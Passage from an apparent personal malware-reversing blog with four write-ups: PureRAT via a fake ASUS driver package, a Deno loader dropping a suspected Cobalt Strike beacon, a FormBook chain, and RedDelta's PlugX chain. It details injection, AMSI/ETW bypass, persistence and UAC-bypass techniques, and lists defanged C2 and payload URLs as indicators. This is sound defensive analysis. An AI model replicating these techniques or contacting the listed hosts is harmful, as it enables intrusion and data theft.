{"index":{"slug":"index","filePath":"_index.md","title":"About ME","links":[],"tags":[],"content":"Q: Who am I?\n\nこんにちは！私の名前はスニルです。\n\nAs of now, I am a student and an independent security researcher (sounds cool innit?) with focus in malware analysis and reverse engineering.\nQ: What on earth is this blog?\nThis blog documents my learnings and analysis in malware reversing.\nSo expect posts related to malware reversing, exploring the mechanics behind malwares and so on.\nQ: How did you started?\nI started off by reading the holy book Practical Malware Analysis book and later expanded my interest with some of the certs and courses i am engaged in or have completed are :\n\nPractical Malware Analysis And Triage (PMAT) by HuskyHacks from TCM Academy\nZero2Automated: Advanced Malware Analysis by Offset Training Solutions\nOpenSecurityTraining2 (OST2) courses\nWindows Malware Analysis for Hedgehogs - Beginner Training by Karsten Hahn\n\nQ: What is MAD?\nMAD stands for Malware Analysis Diary.\nIn these entries, I’ll take a look and try analyzing some interesting and challenging binaries that may include: complex infection, techniques, reverse engineering, obfuscation, and try to cover variety of samples and so on."},"mad-entry/asus-update-to-purerat":{"slug":"mad-entry/asus-update-to-purerat","filePath":"mad-entry/asus-update-to-purerat.md","title":"Entry-02 : Vietnamese spreading PureRAT-y","links":[],"tags":["reverse-engineering","malware-analysis","infection-chain","mad"],"content":"Context of this Entry\nThe context comes from Szabolcs Schmidt Tweet, where he shared a zip file named setup.pkg, that contains three files AsusMouseDriver.sys, Inx, kg.cmd:\n\n\nThings to Setup : kg.cmd\n\nTurns out Inx is a legit command line RAR utility that’ll extract contents from AsusMouseDriver.sys rar archive file in C:\\Users\\Public\\WindowsSecurity folder.\nThen gonna setup an AutoRun Key named UpdateService with command line set to execute ntoskrnl.exe with arguments being .\\Lib\\image, dcal143\nFollowed by running it immediately and displaying a decoy PDF created by thatgirlpossesed4773:\n\nAsusMouseDriver.sys RAR archive contains legit files for Python3.10.11 environment like renamed python executable to ntoskrnl.exe and supported DLLs,\n\nwith only impostor Lib\\image python file being ran with argument dcal143.\n\nThe Loader: Lib\\image\n\n(On the Left) we see image being python file, executes marshaled code-object after some b85 decode and bz2, zlib decompression on a huge buffer.\n(On the Right) we’ll make a PYC file by prepending Python3.10 16-byte magic header to the marshaled code-object to further make sense of it,\nThe huge 74MB size, shows indication of obfuscation by junk insertion.\nTrying to decompile the PYC file using pycdc or pylingual fails due to heavy variable name obfuscation and intentional use of opcodes that hinder decompilation, likely some protector is used:\n\nGoing through the pycdas disassembly output, after replacing the python co_varnames, co_names to placeholders, we can already make some guesses.\n\nInteresting variable and function names like try_request_server, get_bytecodes, decrypt_code, rc4, base64, bz2,  zlib, requests somewhat hints the behavior of this stage.\n\nStarting off with enough imports, it imports libraries like sys, ctypes,  marshal,  zlib,  base64,  bz2,  inspect,  requests.\n\n\n(684-692): id = sys.argv[1], means dcal143 is an id\n(694-714): ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0), this will hide the console window\n\n\n\n(2734-2736): declares the RC4 decryption KEY = b&#039;phuongmai2005&#039;\n(2738-2750): creates a function try_request_server() that takes an argument as ip_server.\n\n\n\n(4446-4460): exec(marshal.loads(get_bytecodes(b64code)), execute the loaded marhsal code-object\n\n\nTL;DR This stage will try to execute a marshal code-object fetched from remote URL, after some Base64 decoding, Zlib decompression, and RC4 decryption.\n\nAs part of obfuscation, string constants are constructed dynamically with lots of lambda expression, which makes it kinda time taking to know the requested URL .\nBut some mock runs gives the payload URL cause python will complain when ran with disabled network access:\n\nGoing to the URL shows an active campaign, which they’re constantly updating with scripts, as of writing, most recent addition is dcal143v2.txt:\n\n\n(On the Left-Bottom) We see marshal bytes, then we do same as previous ie.  prepend magic header to form a new PYC file, then dump to further analyse.\n\nThe Injector : dcal143 Python Marshal-Object\nAgain this marshal code-object is obfuscated, and performs anti-decompilation measure.\nGoing through the variable and function names hints possible process hollowing behavior:\n\nWalking the disassembly, we see it defines many helper functions:\n\n\n(8214-8222): defines NtWriteVirtualMemory function with argument and return types, for later use:\n\nNtWriteVirtualMemory = ntdll.NtWriteVirtualMemory\n \nNtWriteVirtualMemory.argtypes = [ wt.HANDLE, LPVOID, c_void_p, c_size_t, POINTER(c_size_t) ]\nNtWriteVirtualMemory.restype = c_int\n\n(8224-8254) : defines function like killprocessbyid, runpe, shc_loader and the names are self explanatory\n\n\n\n(before-8366): base64_encrypted_pe payload is constructed\n(8368-8370): declares RC4 decryption KEY = b&#039;buiphuonglinh&#039;\n\nSummarizing the following ‘cause the disassembly was too long:\nIt’ll take a look at the current running processes then store them to process_list variable, following is the manual reconstruction of disassembly snippet:\nprocess_list = subprocess.run(\n    [&#039;tasklist&#039;],     # string constructed dynamically\n    stdout=PIPE,\n    text=True,\n    creationflags=CREATE_NO_WINDOW\n).stdout\nthen will eventually compare’em against many antivirus process strings, if found then exits immediately.\n\n\n(8478-8482): calls run_pe(base64_encrypted_pe, KEY) that’ll inject the next payload to a remote process\n(8488-8492): then sleeps for a while time.sleep(20)\n\n\n\n(8634-8638)  : shc_loader(base64_encrypted_shc, KEY) same goes to shellcode loader\n\n\nTL;DR This stage will eventually inject next stage to a remote process, plus inject and run the shellcode to the same process.\n\nWe can get hold of Base64 encrypted shellcode and PE by performing some python injection using a tool called PyInjector:\n\nThis will write the contents of base64_encrypted_pe and base64_encrypted_shc variables the was constructed dynamically to external files.\nrun_pe : PE Injection into cvtres.exe\nStarts system utility cvtres.exe in this case, cross-check its architecture, then uses combination of CreateProcessA, GetThreadContext, NtUnmapViewOfSection, VirtualAllocEx, NtWriteVirtualMemory, SetThreadContext API calls to perform injection:\n\nNow when decoded and RC4 decrypted the content of  base64_encrypted_pe, we get to the next stage which is .NET Reactor protected:\n\nshc_loader: Injection to same process\nThis function uses VirtualAlloc, CreateThread, RtlMoveMemory, WaitForSingleObject, ResumeThread API calls to inject the shellcode in the same process, the x64dbg-&gt;Dump1 in following snap shows the shellcode being ran:\n\nAgain when decode and decrypted, we see this shellcode is generated using an open source tool donut:\n\n\nThe Donut Shellcode: Being Position-Independent\nTaking a quick triage look with capa, we see this shellcode uses some aPLib data decompression, chaskey encryption and PEB access, all smells like donut innit? :\n\nThe following routine from the shellcode is a part of Donut’s chaskey decryption routine that decrypts the next stage for in-memory execution as AppDomain:\n\n\nAbove snippet bypasses Antimalware Scan Interface (AMSI) and Event Tracing for Windows (ETW) by patching related API like AmsiScanBuffer, AmsiScanString, EtwEventWrite, EtwEventUnregister, shows that the shellcode was generated with option -b (bypass) enabled (refer to donut github repo for more).\n\nThe Loader Again : Yxolp.exe The .Net Assembly\n\n\nThis stage will invoke mlBlFRODqNj9jxsZ5wv.LrNv6COPJYQa5wBkwqU -&gt; KU8OtPPFaB() method from .NET assembly that is retrieved from the resource section:\n\nThe TripleDES key and IV are Base64 encoded:\n\nThe method being invoked:\n\nFollowing emit will TripleDES decrypt and Zlib decompress the Hxyez resource from this assembly, we get to last stage that is again .NET Reactor protected DLL file:\n\n\nThe PureRAT Ft. ProtoBuf : Mvgnd.dll\nWe’ll use NETReactorSlayer to get comparatively cleaner version, I’ll go through some of the workings in particular:\n\nThis stage take use of  Protocol Buffers (protobuf-net) for deserialization. One such buffer when deserialized reveals C2 server 151.242.170[.228]  and ports 56001, 56002, 56003, 56004, 56005, 56007, along with another Base64 encoded buffer blob that decodes to an X509 certificate used for TLS pinning, followed by some other values (see right bottom of following snap):\n\nMost of the strings are not decrypted by .NETSlayer, but we get the spirit of these snipppets:\n\nabove code performs socket setup with TLS pinning, for encrypted C2 communication,\n\nMutex creation used to make sure only one instance is running,\n\ndoes persistence via registry key addition with binary value,\n\nWMI query prolly checking any antivirus product presence,\n\ncapture full screenshot then does some conversion to JPEG to store them as an array, to eventually send them to C2 servers,\n\nabove snippet tries to keep itself running, no matter the exceptions occurred.\nAlso contains many more features like fingerprinting via GUID and system resources, capability to execute other plugins received from C2 server, looks for Crypto Wallet credentials from file system paths (%APPDATA%), and registry keys and so on.\n\nThe frequent use of deserialzed ProtoBuf object, along with other characteristics resembles of this being PureRAT/PXA Stealer (similarity found in other incidents). Many variable from python loader/injectors are in Vietnamese, but the C2 server is located in Singapore, It is possible that they’re using remote servers.\n\nSee ya in another post, till then have a nice time :)\n\n\nIOC(s)\n\nsource : x.com/smica83/status/1976718339314516476\nsetup.pkg : 45f9b2a451141d50faf17513f0d78064716dc673a976e77da0bdf7fe27719106\nhttps[:]//104.194.153[.]193/homepage/links?id=dcal143\nYxolp.exe .NET Assembly: 3de860c805c65fadae42459736cfebd92e4636c1964d8c21049b990d1c5f90f0\ndonut shellcode: 40a6d7433ca98739f07fd0658cf3ecdd4c8119d601308122fc78dce8a2e47812\nMvgnd.dll : 380b32e1c665993dcc4691bc1161ae5c44f94e7aeefe31adcd9acd83bc8313c2\nC2 server : 151.242.170[.]228\n"},"mad-entry/evil-deno":{"slug":"mad-entry/evil-deno","filePath":"mad-entry/evil-deno.md","title":"Entry-01 : Evil Deno Caught In Wild","links":[],"tags":["reverse-engineering","malware-analysis","infection-chain","mad"],"content":"Context of this Entry\nThe context originates from MalwareHunterTeam Tweet. This introduces an executable named GoogleDriverSetup.exe, It is compiled using Rust based JavaScript runtime called Deno. Let’s get started!\n\nstage01 : Evil Deno\nIt all starts with an executable that sizes to approx.81.4MB, it’s a DenoJS compiled executable:\n\nThis holds the JavaScript to run in the resources section of the binary. This technique is referenced from Evil Deno.\n\nThe JavaScript can be deobfuscated using deobfuscate.io. This simply contains a powershell command that’ll execute another powershell script loaded from remote URL dynamically:\n\n\nstage02 : set startup item\nThis script declares some variables at first:\n\nDownloads script1.aspx from an url and Python3.13.7:\n\n\nIt then sets up a system startup task that runs script (script1.aspx) on startup using pythonw.exe.\n\nstage03 : python shellcode loader\nThis script1.aspx marshal loads a python code object, then executes exec() after base64 decode and zlib decompress:\n\nOnce we get the code-object to be loaded, we can then prepend PYC header of 16byte of Python3.13 to make it a PYC file, then using Pylingual we decompile the pyc file to get following python code on the right:\n\nAs the name of the decompiled python says heap_alloc_shellcode_loader.py, it loads a shellcode(a DLL file) to the current process using simple CreateThread() call using python ctypes module.\n\nstage04: the DLL file\nsimilar samples found based on imphash: c3d7ddc86c9402d44b3c8487b2ead7aa :\n\nmain driver function are same, also both uses same Mutex string : Global\\\\OALvPABeVdMtx\n\nsub_180009240() of this sample performs anti-hooking setups and checks like:\n\n\nSetting the ProcessInstrumentationCallback to NULL via NtSetInformationProcess API call, that can be used  bypass EDR hooks.\nFollowed by code that resolves many API dynamically and check if it can get the syscall of those exports from ntdll, this technique checks if any trampolines are in place or not:\n\nbefore and aftre running sub_180009240():\n\n\nif any anomaly detected then move onto load the module from disk:\n\nThen the sample’s further logic comes from various vtable functions calls:\n\n\nfrom here-on it will call function related to system recon, C2 connection, download and executes function and so on.\nIt starts off with some system recon, to eventually send to the their C2 server http[:]//185.193.125[.]160/d :\n\nWhile i was debugging’ in my Windows10 VM and step over the following IWbemLocator::ConnectServer function call at offset 0x7AB5 the debugger never returned, maybe because my VM COMServer was not responding:\n\nThe other sample includes additional unpacking routine as part of anti-analysis measures before calling vtables functions, but the purpose remains the same for both samples:\n\nSuspicions of these being CobaltStrike beacon based on some detection:\n\notx.alienvault.com/indicator/file/84f34f24a7f7852ac1c5e99ec3de6e215138d7b8a39514963dc6596945b105d8\nwww.virustotal.com/gui/file/c5f717f2bb294ae97df415900c1c4e025b73fa6b709d4ed0395c3e157a3b2e0e/community\n\n\nstage05: another python script\nThis stage eventually attempts to use cmstp.exe (to gain elevated privileges) and a malicious INF file to execute arbitrary PowerShell code from a remote source https[:]//pastebin.com/raw/TvvskyQL,\nThe script2.aspx is on the left, decoded and decompressed output is on the right:\n\n\nthen it simulates a user pressing Enter (via ctypes and window messages) to silently approve prompts.\n\nstage06: multi-user persistence\n\nThis script ensure persistence by creating a scheduled task for each user that’ll execute script1.aspx on logon with additional settings, then starts the task immediately.\n\nIOC(s)\n\nsource : x.com/malwrhunterteam/status/1964023478060716437\nGoogleDriverSetup.exe : 84f34f24a7f7852ac1c5e99ec3de6e215138d7b8a39514963dc6596945b105d8 : https://cutt[.]ly/drivefilestreamGoogleDriveexe → www.dropbox[.]com/scl/fi/fn1bowuqm3dmnr8boa295/GoogleDriverSetup.exe\nololo.aspx : https[:]//ololo-dsj.pages[.]dev/ololo.aspx\nscript1.aspx : https[:]//4243384121f3d8cfb9681a012552537f.pages.dev/script1.aspx\nShellcode (DLL) : 9231e77c960570548cd053d9a9eaaf62e50e7b21b36521d82b31a02d7f9f57cd has C2 http[:]//185.193.125[.]160/d\n\nsimilar sample: c5f717f2bb294ae97df415900c1c4e025b73fa6b709d4ed0395c3e157a3b2e0e has C2 https://swiftedgecloud[.]com/d\n\n\nscript2.aspx : 42a25631.yr52byzdja.pages[.]dev/script2.aspx\nhttps://pastebin[.]com/raw/TvvskyQL\n\n\nMore reads\n\nunit42.paloaltonetworks.com/cobalt-strike-memory-analysis/\nwww.huntress.com/blog/cobalt-strike-analysis-of-obfuscated-malware\nchecking the hooks : www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions\nwww.outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nwindows system call table : j00ru.vexillium.org/syscalls/nt/64/\nsplintercod3.blogspot.com/p/weaponizing-mapping-injection-with.html\nwww.riskinsight-wavestone.com/en/2023/10/process-injection-using-ntsetinformationprocess/\nwww.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/\n"},"malware-analysis/formbook-infection-chain":{"slug":"malware-analysis/formbook-infection-chain","filePath":"malware-analysis/formbook-infection-chain.md","title":"Memory-Only Mayhem : JScript to Powershell to .NET Loader to Infostealer","links":[],"tags":["reverse-engineering","malware-analysis","infection-chain","malware-campaign","infostealer"],"content":"An Introduction\nWelcome back and I hope you guys are having a nice time :)\nCouple of weeks ago, while i was looking for a malware to analyze, I came across this sample on malware bazaar, that is initially a JScript file.\nWhen started analyzing it enfolds into multi-staged infection chain incorporating from jscript file, to in memory execution of layers of powershell payloads, to stenography, to dynamically loading packed and obfuscated .NET dll, to exploiting a LOLBIN to dynamic execution of an infostealer. A key highlight of this infection chain is its heavy reliance on in-memory execution, minimizing disk footprint across stages.\nI’ve noticed many variants and IOCs utilizing similar infection chain around that time. Also variables in scripts and .NET loader are in Portuguese, hinting adversaries are likely to be Brazilian or Portuguese. With that in mind, let’s get technical.\nThe infection chain follows:\n\n\nThe JScript File\nThe infection chain starts off with a JScript file ran using wscript.exe LOLBIN, that is obfuscated with loads of junk code, where many function are defined with same name EHREnoNW(). But only the last function get executed when called, ‘cause in JScript the last function definition overrides the previous function definition of same name.\n\nThe function starts by creating a MSXML2.ServerXMLHTTP object to make HTTP(s) requests and receive response from a server. Then decodes an encoded buffer using simple split and join operation, to reveal an url ie. hxxps://smoke.infinityfree.me/arquivo_6ce89fee1d04446b8f852e7e08c9df85.txt. Then uses eval() for dynamic execution of response text from the url.\n\n\nJScript → Powershell → .NET Assembly DLL\nThe response text is another slightly obfuscated JScript code, after some decoding and cleaning:\n\n\n\n(1) we see this’ll instantiate a powershell process using Win32_Process.Create WMI class method, executes the powershell payload in (2)\n(2) this powershell payload uses the Invoke-Expression cmdlet to execute powershell code in (3) after base64 decode,\n(3) this fetches the content of a  jpg image at hxxps://archive.org/download/msi-pro/MSI_PRO.jpg and extract bytes from mentioned tag ie. BaseStart- to -BaseEnd. (Some low effort stenography),\ntaking a look at the JPG in hex editor we see the same tag followed by a huge base64 encoded stub:\n\n\n\nwhen base64 decode this buffer reveal another stage, this time it’s a .NET assembly dll obfuscated using .NET Reactor,\nthen uses MethodBase.Invoke method to invoke ClassLibrary1.Home.VAI method with supplied arguments, where the first argument is $olinia that holds a base64 encoded value.\n\n\nThe .NET assembly dll\nThis stage is a .NET dll binary protected and obfuscated using .NET Reactor.\nAlso the binary is a mix of three .NET projects:\n\nVMDetector1 : to detect if the binary is inside a VM\nTask Scheduler2 : original .NET wrapper for the Windows Task Scheduler\nRunPE by HackerForums.gigajew : having process injection capabilties\n\ndeobfuscation\nIn order to make sense of the assembly we’ve to de-obfuscate it, I’ve used couple tools in order ie.\n\nde4dot.exe3\nNET-Reactor-Cflow-Cleaner4\nNET-Reactor-String-Cleaner5\nNETReactorSlayer6\n\nUsing these will attempt to remove Anti-Tamper, Anti-Debugger, Anit-Virtualization, Anti-ILDASM, Control Flow Obfuscation and related functions, and will try to reconstruct strings and methods names, Once done it’ll present us with relatively cleaned version. You can see the before and after in following:\n\n\nNow we can make sense of the code and continue with infection flow.\nEarlier, we saw how Home.VAI method is loaded with following passed arguments:\n$method.Invoke($null, [object[]]@($olinia,&#039;&#039;,&#039;&#039;,&#039;&#039;,&#039;MSBuild&#039;,&#039;&#039;,&#039;&#039;,&#039;&#039;,&#039;&#039;,&#039;C:\\Users\\Public\\Downloads&#039;,&#039;anesthetist&#039;,&#039;js&#039;,&#039;&#039;,&#039;&#039;,&#039;tekkana&#039;,&#039;2&#039;,&#039;&#039;));\nMapping these values to method parameters we get:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nparametervalueQBXtX$olinia ie. base64 encoded buffernetframeworkMSBuild ie. process to be injectedcaminhoC:\\Users\\Public\\Downloadsnomedoarquivoanesthetiststring_0jstasknametekkanavmName2\nBehavior is determined based on arguments values.\nEventually, a payload is injected into a .NET process of MSBuild.exe using Process Hollowing technique.\nvm-detection:\n\nIf vmName is 1, then this binary will attempt to detect if it’s inside a virtual machine or not by calling VMDetector.Assert(out text) 1, in addition it also checks for victim’s MAC address against specified value, where OUI (52:54:00 hinting vendor Red Hat Inc.) commonly used for virtual machines, especially KVM/QEMU virtual network interfaces.\npersistence:\n\nIf persitencia is 1, then it’ll create a scheduled task with misleading description &quot;Download and execute PuTTY every 1 minute indefinitely.&quot; (when translated from Portuguese), then moves on to form a quick Powershell payload that’ll:\n\ndownload a file(Invoke-WebRequest) from given url,\nsave the file to a directory(caminho) with a given name nomedoarquivo.string_0,\nto execute it immmediately via Start-Process.\nThen sets the task with time trigger to start when available and repeat every minute, plus a boot trigger.\n\nstartup task:\n\nIf startuptask is 1, then check if nomedoarquivo.string_0 does not exist at caminho,  if missing, runs hidden cmd command to copy a file in current directory with string_0 extension to the target location.\nCreate a scheduled task to execute the downloaded file via wscript.exe(used to run vbscript, jscript scripts) , and trigger on a time-scheduled.\nstartup registry:\n\n\nIf startupreg is 1, then establishes a registry key for current user startup program that ensures the file runs automatically at user login after it creates or updates a registry value named &quot;Path&quot; pointing to the copied file’s full path.\ndownload and execute:\n\nMoving ahead in this very infection chain, the QBXtX value holds a base64 encoded buffer, when decoded reveals a url hxxps://pub-3df3bd0a00214b4f9102f645511ab7ad.r2.dev/8100.txt:\n\n\nWhich reveals a PE32 executable when base64 decoded:\n\nMoving on, checks executable architecture to call RunPE function accordingly ie. x32.Load or x64.Load with argument to netframework target process to inject ie. MSBuild.exe path in this case:\n\nFollowing snap shows process hollowing in action, where MSBuild.exe is injected with next stage :\n\nIn this case, the injected payload was a formbook infostealer. Here’s the Virus Total link and VMRay report for the same:\n\nThe binary is initially in packed state and again filled with junk and useless code to slow down analysis like previous stages.\n\nIt dynamically resolves NtQueryVirtualMemory, NtProtectVirtualMemory syscalls from NTDLL.DLL and uses custom RC4 decryption routine along with many XOR operations to locate and decrypt a heavy chunk of prolly shellcode within the binary and invokes a function from it.\n\nI’m planning to take an in-depth look on this infostealer in future post.\n\nTill then stay tuned and have a nice time :)\n\nIOCs\n\n401228957d3c13eaacfdf3154bb0c1f146b59c3615cd40848a54a211a7e14f72 : Enquiry.js\nhxxps://smoke.infinityfree.me/arquivo_6ce89fee1d04446b8f852e7e08c9df85.txt\nhxxps://archive.org/download/msi-pro/MSI_PRO.jpg\nhxxps://pub-3df3bd0a00214b4f9102f645511ab7ad.r2.dev/8100.txt\n.Net Assembly DLL : 36a58d8d96450b789a9116acac6fa41f003c869c49c7ec929b790f6d94e5596b\nformbook binary : 2032192834795c035bf9cffc7c0244d4227a5c30b3cb38799afa5416183ecca9\nc0c7f3e262e683f115414ca7d3275ca22734116737a277d727aed3db8982b918 : SAP Ariba Gulf ADNOC Rig Contract RFQ.js\nhxxp://serverfilee.ct.ws/arquivo_0a3756526bf94e43879d922f9d53c172.txt\n30696a55f1b221f9a1886282bfb684977a41dac6dacf5e63c6722e025ae8266a : New_Quotation_pdf.js\nhxxp://serverfilee.ct.ws/arquivo_b300501e36854d6fb850b95bb38752ab.txt\n\n\nReferences:\n\ngithub.com/hexfati/SharpDllLoader\ngithub.com/NotPrab/.NET-Deobfuscator\ncyber.wtf/2025/04/07/dotnet-deobfuscation/\nwww.codeproject.com/Articles/12585/The-NET-File-Format\ngithub.com/advanced-threat-research/DotDumper#features\nwww.virusbulletin.com/uploads/pdf/conference/vb2022/papers/VB2022-Combating-control-flow-flattening-in-NET-malware.pdf\nsimilar incident report : www.sonicwall.com/blog/vmdetector-based-loader-abuses-steganography-to-deliver-infostealers\nblog.washi.dev/posts/entry-points/\ngithub.com/binref/refinery/blob/master/README.md\n\nFootnotes\n\n\ngithub.com/robsonfelix/VMDetector ↩ ↩2\n\n\ngithub.com/dahall/TaskScheduler ↩\n\n\ngithub.com/GDATAAdvancedAnalytics/de4dotEx ↩\n\n\ngithub.com/void-stack/NET-Reactor-Cflow-Cleaner-6.7.0.0 ↩\n\n\ngithub.com/void-stack/NET-Reactor-String-Cleaner-6.7.0.0 ↩\n\n\ngithub.com/SychicBoy/NETReactorSlayer ↩\n\n\n"},"malware-analysis/redDelta-malware-campaign-aug-2024":{"slug":"malware-analysis/redDelta-malware-campaign-aug-2024","filePath":"malware-analysis/redDelta-malware-campaign-aug-2024.md","title":"Analysis of RedDelta's recent Infection Chain","links":[],"tags":["reverse-engineering","reddelta","malware-analysis","plugx","malware-campaign","infection-chain"],"content":"The introduction\nIn this blog, we’ll explore a recent infection chain of malware campaign carried out by Chinese State Sponsored threat actor RedDelta to deliver customized PlugX malware.\nThe infection chain we gonna cover was observed in later half of 2024, which consist of MSC(Microsoft Management Console Snap-In Control) file as the first-stage component. Upon execution, the MSC file was configured to execute VBScript that download and installs a remotely hosted Windows Installer (MSI) file, this MSI file then drops a legitimate executable vulnerable to DLL search order hijacking, a malicious loader DLL written in NIM programming language, and a DAT file containg encrypted PlugX payload and displays a decoy document.\nThis specific infection chain was observed when RedDelta targeted Mongolian Ministry of Defense and other Southeast Asia around August 2024 as per analysis done by Insikt Group from Recorded Future in the pdf report from article Chinese State-Sponsored RedDelta Targeted Taiwan, Mongolia, and Southeast Asia with Adapted PlugX Infection Chain\n\nShout out to themalwareguy and Zero2Automated for asking us to analyse this malware campaign as part of bi-monthly challenge for January 2025 :)\n\nThe infection chain\n\n\nTechnical analysis\nWe’ll go through the infection chain stage by stage and observe the TTPs used, the samples can be found here Strike Ready Labs.\nWe’ll kick-off with the .MSC file\nA hoax : MSC file\nThe infection chain starts with a file named Meeting invitaion.msc presenting itself as a PDF.\n\nThis file performs a GrimeResource technique which allows attackers to execute arbitrary code in Microsoft Management Console(mmc.exe)\n\ntldr; this GrimeResource technique abuses an old XSS flaw found in APDS.DLL to runs JScript which uses transformNode obfuscation(aids in evading ActiveX security warnings), which leads to an unescaped XML script, that executes an embedded VBScript in context of mmc.exe.\n\nThe VBScript instantiates an WindowsInstaller.Installer object where wshshell.uilevel is set 2 to perform silent installation (see Installer.UILevel Property), then download and installs a file ver.dat hosted on Microsoft Azure cloud with the subdomain hxxps[:]//cdn7s65[.]z13[.]web[.]core[.]windows[.]net\nIn short, when the users clicks the MSC file, the file runs the VBScript that downloads and install a remotely hosted MSI file ie. ver.dat.\n\nThe reliance : MSI file\nThe DIE output confirms that ver.dat is indeed an MSI Installer file.\ncmd&gt; diec.exe files\\ver.dat\nBinary\n    Installer: Microsoft Installer(MSI)\n    Data: Microsoft Compound\nDropped files\nWhen examining suspicious MSI, we should start by looking at embedded files, we can use tools like as lessmsi , msidump, orca etc. to extract and view’em:\n\n\nalso the summary section shows the creation date of August 2024 which matches campaign timeline.\n\nNOTE: that Creation Date/Time can be spoofed or altered. But doesn’t look like it’s been spoofed this time\n\nWith a quick triage on the files extracted, we see:\n\nLDevice.dat : is a file with mostly gibberish bytes, hinting possibly packed/encrypted\nhid.dll : a PE32 DLL file written with NIM programming language\nLDeviceDetectionHelper.exe : a legitimate and digitally signed executable by Logitech and also Virus Total shows it as clean file:\n\n\nTable inspection\nMSI files are structured as relational databases used by the Windows Installer. The database consists of several tables, each serving a specific purpose in the installation process.\nFrom malware analysis perspective - we gonna examine some of interesting inner tables. We can start by looking all actions that may happen automatically when installer runs.\n\nFor in-depth analysis of MSI file check the footnote 1 2\n\nCustom Action Table\nCustomAction Table defines custom actions that refers user-defined command or script that runs during installation process that are usually not handled by MSI Standard Actions.\nThese actions can include running an executable, system command, loading a DLL, setting properties etc. Let’s see what custom actions does this MSI file defines\n\n\nthe first action, SetOblsaYFUJOqn will set the property OblsaYFUJOqn to [%LOCALAPPDATA]\\FRKBrMZCk (see Custom Action Type 51), indicating the installation directory for the files to be extracted\nthe second action, WwcslyN will set to the target executable path [%LOCALAPPDATA]\\FRKBrMZCk\\LDeviceDetectionHelper.exe\n\nInstallExecuteSequence Table\nCustom Actions cannot be triggered on its own, thus there must be some scheduling that dictates when to launch, there comes the InstallExecuteSequence table that defines actions to be executed in sequence.\n\nAbove screenshot shows the InstallExecuteSequence table for this MSI file, where important actions goes like this:\n\nSetOblsaYFUJOqn (Sequence 801) : set a property (OblsaYFUJOqn) to [%LOCALAPPDATA]\\FRKBrMZCk likely used by subsequent custom actions,\nthen InstallInitialize action and InstallFinalize action mark the beginning and end for sequence of actions that commits the system changes.\nin the end, WwcslyN (Sequence 6601) : means it will execute after successful commit on system changes made during installation process, where condition NOT REMOVE indicates not to run it during uninstallation.\n\nIn short, This MSI file drops the three files into the user’s LocalAppData\\FRKBrMZCkfolder,\n\nand launches an executable LDeviceDetectionHelper.exe after the installation has finalized.\n\n\nA betrayal to tell : legitimate executable\nNow that we know LDeviceDetectionHelper.exe is decent file,\nand gonna load hid.dll module because its vulnerable to DLL Hijacking Techniques, DLL Side Loading (T1574.002) to be specific,\n\nthis tactic has also been noticed in other operations of RedDelta (see footnotes 3 4 5).\n\nAnd the Procmon captured events reflects the same:\n\nNow the actual point where the trigger happens goes like this:\nthe innocent LDeviceDetectionHelper.exe usually calls an export from hid.dll ie. HidD_GetHidGuid at offset LDeviceDetectionHelper.exe+0x6DBD2 within sub_46E7A0 subroutine, as we can see below\n\nUsually the executable would have loaded the normal C:/Windows/SysWOW64/hid.dll, but the fact it’s vulnerable to DLL search order hijacking and does not verify the loaded module, this loads and execute the malicious hid.dll’s export HidD_GetHidGuid instead.\nYou can see the comparison between the two hid.dll:\n\n\nThe disguise : NIM Loader\nThe hid.dll is written using NIM language, looking at dll exports we see the disguised export HidD_GetHidGuid, let’s see what this function does\n\n\nTIP: NIM is notorious when comes to shipping symbols which makes it hard to identify even system calls. So one can use tools like NimFilt to demangle NIM symbols within your desired disassembler.\n\nHidD_GetHidGuid subroutine\n\nthis starts by dynamically resolving Windows API functions with a call to a subroutine sub_6E848AAC, that uses series of functions referenced from Nim_DInvoke Library,\nlike DInvoke::get_library_address along with DInvoke::get_function_address supplied with hash to dynamically resolve windows functions\nand has a custom api hashing routine sub_6E847344 (ie. @getHash__687nvoke_u95@4 at offset hid.dll+0x6944) and here’s a quick python script for de-hashing them\nhaving function names resolved, we see it calls RegisterClassW to register WNDCLASS STRUCT which has an interesting member WNDPROC lpfnWndProc, looking on MSDN it says:\n\n\nWNDPROC callback function :\nA callback function, which you define in your application, that processes messages sent to a window. The WNDPROC type defines a pointer to this callback function.\n\n\nand the callback function is set to sub_6E847C4C (ie. _mgdtfX__8788p_u880@16 at offset hid.dll+0x724C) which is triggered with subsequent calls related window manipulation like CreateWindowExW , ShowWindow (see Remarks for why).\n\n\n\nand creates a hidden Window Class name EDIT. Which is an identifiable attributes for PlugX . This behavior is mentioned in this Unit42 THOR PlugX Variant article\n\n_mgdtfX__8788p_u880@16 subroutine\nThis will make a call to CreateThread where argument lpStartAddress points to function sub_6E8488B8 (ie. _bxRoBaPhPJT__8788p_u824@4 at offset hid.dll+0x7EB8) which is executed immediately as dwCreationFlags is 0\n_bxRoBaPhPJT__8788p_u824@4 subroutine\n\ngrabs the path to LDevice.dat then make a call to sub_6E848545 (ie. @CtOtHXjnm__8788p_u277@12 at offset 0x7B45) that will first RC4 decrypt LDevice.dat with harcoded key BhaPKNSALeXZBJYz\n\n\nTIP: bunch of 256 constants in a subroutine is usually an indicator of RC4 algorithm used\n\n\n\ndecrypted LDevice.dat is then injected to same legitimate process of LDeviceDetectionHelper.exe using sequence of system windows API calls like ZwAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, and EnumSystemGeoID where callback function lpGeoEnumProc points to this decrypted executable memory region.\n\nResulting in deploying PlugX RAT, VT detection clearly associates this file with family label korpug, plugx, zusy\n\n\nDecoy document\nIt also presents user with Meeting Invitation.pdf loaded in the user’s PDF viewer describing a Zoom meeting invite.\n\n\nPersistence\nAfter copying executable and malicious module to new location,a new run registry key value SetPoint is created for persistence, which executes LDeviceDetectionHelper.exe upon user login.\n\nConclusion\nRedDelta Group uses customized PlugX malware to carry out its espionage with evolving Tactics, Techniques &amp; Procedures(TTPs) like abusing legitimate and digitally signed binaries, using sophisticated MSI files to bundle all the required files, also adapting to new programming languages like NIM. Hinting RedDelta will continue its campaign with evolved infection chains.\nAlso steps taken by authorities in response of Chinese APTs and PlugX like\nJustice Department and FBI Conduct International Operation to Delete Malware Used by China-Backed Hackers\n\nAutomation 